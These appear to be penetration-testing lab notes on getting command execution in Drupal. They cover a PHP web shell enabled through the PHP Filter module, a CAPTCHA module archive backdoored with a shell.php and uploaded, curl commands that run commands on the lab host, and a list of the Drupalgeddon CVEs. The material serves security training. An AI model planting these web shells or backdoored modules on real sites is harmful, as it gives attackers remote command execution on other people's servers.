## Leveraging the PHP Filter Module
In *Drupal Version < 8*:
We can allow php code to be evaluated by accessing the module section and enabling PHP Filter.
Next, we can go to Content --> Add content and create a `Basic page`.
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
Make sure to set Text format to PHP code below then click on save.
```shell
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id 
```

In *Drupal Version >= 8* we have to install the module ourself.
Go to `Administration` > `Reports` > `Available updates`.
*Note*: Location may differ based on the Drupal version and may be under the Extend menu.

From here we can install php-8.x-1.1.tar.gz (Located in /opt) and click on install.
Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example.

## Uploading a Backdoored Module
Drupal allows users with appropriate permissions to upload a new module
Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).
```shell
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar -xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. 
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```shell
mv shell.php .htaccess captcha
```

Compress:
```shell
tar cvf captcha.tar.gz captcha/
```
Click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
```shell
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Leveraging Known Vulnerabilities
- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as *Drupalgeddon*, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as *Drupalgeddon2*, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as *Drupalgeddon3*, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.